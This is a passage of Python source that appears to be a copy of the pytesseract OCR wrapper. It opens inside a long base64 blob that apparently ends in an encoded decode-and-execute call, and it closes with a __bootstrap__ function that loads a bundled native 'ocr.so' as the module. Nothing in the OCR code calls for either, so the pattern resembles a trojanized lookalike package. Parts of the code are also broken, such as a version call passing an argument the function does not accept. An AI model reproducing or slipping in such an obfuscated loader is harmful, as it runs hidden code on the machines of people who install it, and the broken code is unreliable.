ZjSXV841oD6U+7g0mEgUx/15IS3K6PoB/osd9y8HGH5c5mTOY2zgfWfHiCigIDnnvDfuK94jE9EV5HUJ42mQNc1n3G/Aj3eshCrpI9v6GDUUqMV01j649Xxn2Bp87unJ0gifvxqRAUaE6pUEezUjI1UZa8cej28/lg6YNrX9uDLH4pr8+DGQ9x0g7vPHkzM/qgaYYeuDMuc0kRtm2DMnKLnOwuRUsuBQ7SXzFoksypxEOGVviM2mTX/vxdOKF0ood/gSF2aw2K4FrO8FvR1DxC+yMd7CfY5+gV0dOd/gqu5Djb0NW9QEpGH7dFRjs0ZP34z81WiiusxKmrsSBk6755HsuYXkwv35x6m9cvphgehPsrGaPH69VwDd8cEp/yZiqIqZfEap0GPqmjaxObWLFaEGE14eQrZq4r4L8Q49IYk1VlQLCt+8EW6a0NBAI1JGts0lWMy1Dy3Uhq/7tpNWTrgI/LNMX+Uu29nZ0PRUPqxSj6zxL6Ltjh2cG1LwtQBCmSzc6k82MKnIotDV6/o1oF4u9pe89wFS0oRLwzW31744QkYN//GDYJ4CZtnciyh19Zh1FkBTFrjEWEs2TwXumQZuxl2Y6KmdG46YTOvcx8YzJtuZzqBLXr3v4DZVHJzHRPnCs9ZzjtUFVI2yi8Xn9HW31rZ2BYl+c1sYbrkknNWk46eXoO8bthHvd0AcNef3OSapVAzori2+1pUY+s/bMpQSmi5FHpR2tm37mhR2Z6zZ3Gi+uikcfuLI4DUmgrCGuXxnFiettDWMUAmAKisRvlRYEBsclsAP6E4Xx1dAAHQgF+1LkIs3TQKEk6GQ2JhYX09xVY8UcyJ+pdSWA6DQEjHjH3cCzvXrFSLnav1X2ACdoUP0V/w9Ue/pyh2DLUrKupnSrGd3hOg6ycuGvcZLPLBPdi4tUOiNNsL+EcJcQQucQL09eNDoAg7j0JjRBLkz62A/L1bjssrDi3Ox5LUQmA6Dpax9k2cAvsoqO5mvjGDcNaTqkkO4VnpAQtW9EpHGrs4IinEZrAPzSKCLUOrcjFmLiG8Hrm/DBMnFV+ALOhAS5kRkT3s00bAv4OVlk1Z0827CZHyEmF088giiR+tS+6tcjqfDFoJI/aePVLszh83zVCVYnBwi1JUBnYgEqwinjh6vrQKbHVoRBfUrjyxvWxAW+IF4VNU5caDEboJoPvrVLKRJtrX3455NzLhxVB5+xPSMBiqIASXYxAJvnaAH4/fZ/z77//nn/vMfySoaf9sefekgYVNPV/8effg5BT8mcPg61g3BM4qn+TR2iFhydsmVwJe'))
def file_to_dict(tsv, cell_delimiter, str_col_idx):
    result = {}
    rows = [row.split(cell_delimiter) for row in tsv.strip().split('\n')]
    if len(rows) < 2:
        return result

    header = rows.pop(0)
    length = len(header)
    if len(rows[-1]) < length:
        # Fixes bug that occurs when last text string in TSV is null, and
        # last row is missing a final cell in TSV file
        rows[-1].append('')

    if str_col_idx < 0:
        str_col_idx += length

    for i, head in enumerate(header):
        result[head] = list()
        for row in rows:
            if len(row) <= i:
                continue

            if i != str_col_idx:
                try:
                    val = int(float(row[i]))
                except ValueError:
                    val = row[i]
            else:
                val = row[i]

            result[head].append(val)

    return result

def is_valid(val, _type):
    if _type is int:
        return val.isdigit()

    if _type is float:
        try:
            float(val)
            return True
        except ValueError:
            return False

    return True

def osd_to_dict(osd):
    return {
        OSD_KEYS[kv[0]][0]: OSD_KEYS[kv[0]][1](kv[1])
        for kv in (line.split(': ') for line in osd.split('\n'))
        if len(kv) == 2 and is_valid(kv[1], OSD_KEYS[kv[0]][1])
    }

def get_languages(config=''):
    cmd_args = [tesseract_cmd, '--list-langs']
    if config:
        cmd_args += shlex.split(config)

    try:
        result = subprocess.run(
            cmd_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
    except OSError:
        raise TesseractNotFoundError()

    # tesseract 3.x
    if result.returncode not in (0, 1):
        raise TesseractNotFoundError()

    languages = []
    if result.stdout:
        for line in result.stdout.decode(DEFAULT_ENCODING).split(linesep):
            lang = line.strip()
            if LANG_PATTERN.match(lang):
                languages.append(lang)

    return languages

def get_tesseract_version():
    """
    Returns Version object of the Tesseract version
    """
    try:
        output = subprocess.check_output(
            [tesseract_cmd, '--version'],
            stderr=subprocess.STDOUT,
            env=environ,
            stdin=subprocess.DEVNULL,
        )
    except OSError:
        raise TesseractNotFoundError()

    raw_version = output.decode(DEFAULT_ENCODING)
    str_version, *_ = raw_version.lstrip(string.printable[10:]).partition(' ')
    str_version, *_ = str_version.partition('-')

    try:
        version = parse(str_version)
        assert version >= TESSERACT_MIN_VERSION
    except (AssertionError, InvalidVersion):
        raise SystemExit(f'Invalid tesseract version: "{raw_version}"')

    return version


def image_to_string(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to string
    """
    args = [image, 'txt', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: {'text': run_and_get_output(*args)},
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_pdf_or_hocr(
    image,
    lang=None,
    config='',
    nice=0,
    extension='pdf',
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to pdf/hocr
    """

    if extension not in {'pdf', 'hocr'}:
        raise ValueError(f'Unsupported extension: {extension}')

    if extension == 'hocr':
        config = f'-c tessedit_create_hocr=1 {config.strip()}'

    args = [image, extension, lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_alto_xml(
    image,
    lang=None,
    config='',
    nice=0,
    timeout=0,
):
    """
    Returns the result of a Tesseract OCR run on the provided image to ALTO XML
    """

    if get_tesseract_version(cached=True) < TESSERACT_ALTO_VERSION:
        raise ALTONotSupported()

    config = f'-c tessedit_create_alto=1 {config.strip()}'
    args = [image, 'xml', lang, config, nice, timeout, True]

    return run_and_get_output(*args)


def image_to_boxes(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing recognized characters and their box boundaries
    """
    config = (
        f'{config.strip()} -c tessedit_create_boxfile=1 batch.nochop makebox'
    )
    args = [image, 'box', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: file_to_dict(
            f'char left bottom right top page\n{run_and_get_output(*args)}',
            ' ',
            0,
        ),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def get_pandas_output(args, config=None):
    if not pandas_installed:
        raise PandasNotSupported()

    kwargs = {'quoting': QUOTE_NONE, 'sep': '\t'}
    try:
        kwargs.update(config)
    except (TypeError, ValueError):
        pass

    return pd.read_csv(BytesIO(run_and_get_output(*args)), **kwargs)


def image_to_data(
    image,
    lang=None,
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
    pandas_config=None,
):
    """
    Returns string containing box boundaries, confidences,
    and other information. Requires Tesseract 3.05+
    """

    if get_tesseract_version(cached=True) < TESSERACT_MIN_VERSION:
        raise TSVNotSupported()

    config = f'-c tessedit_create_tsv=1 {config.strip()}'
    args = [image, 'tsv', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DATAFRAME: lambda: get_pandas_output(
            args + [True],
            pandas_config,
        ),
        Output.DICT: lambda: file_to_dict(run_and_get_output(*args), '\t', -1),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def image_to_osd(
    image,
    lang='osd',
    config='',
    nice=0,
    output_type=Output.STRING,
    timeout=0,
):
    """
    Returns string containing the orientation and script detection (OSD)
    """
    config = f'--psm 0 {config.strip()}'
    args = [image, 'osd', lang, config, nice, timeout]

    return {
        Output.BYTES: lambda: run_and_get_output(*(args + [True])),
        Output.DICT: lambda: osd_to_dict(run_and_get_output(*args)),
        Output.STRING: lambda: run_and_get_output(*args),
    }[output_type]()


def main():
    if len(sys.argv) == 2:
        filename, lang = sys.argv[1], None
    elif len(sys.argv) == 4 and sys.argv[1] == '-l':
        filename, lang = sys.argv[3], sys.argv[2]
    else:
        print('Usage: pytesseract [-l lang] input_file\n', file=sys.stderr)
        return 2

    try:
        with Image.open(filename) as img:
            print(image_to_string(img, lang=lang))
    except TesseractNotFoundError as e:
        print(f'{str(e)}\n', file=sys.stderr)
        return 1
    except OSError as e:
        print(f'{type(e).__name__}: {e}', file=sys.stderr)
        return 1

def __bootstrap__():
    global __bootstrap__, __loader__, __file__
    import sys, pkg_resources, importlib.util
    __file__ = pkg_resources.resource_filename(__name__, 'ocr.so')
    __loader__ = None; del __bootstrap__, __loader__
    spec = importlib.util.spec_from_file_location(__name__,__file__)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)


